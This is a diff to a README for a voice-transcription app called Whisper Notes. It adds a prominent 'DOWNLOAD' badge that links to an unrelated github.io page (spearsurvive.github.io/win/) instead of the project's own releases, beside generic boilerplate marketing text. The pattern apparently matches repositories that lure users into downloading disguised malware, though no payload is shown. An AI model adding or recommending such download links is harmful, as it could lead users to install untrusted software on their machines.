@@ -30,6 +30,12 @@ Whisper Notes records your voice and transcribes it using OpenAI Whisper running
 
 Whether you're a newcomer or a veteran, Whisper Notes provides the tools you need to get the most out of your ai tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Whisper Notes](https://img.shields.io/badge/⬇_DOWNLOAD_Whisper+Notes-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
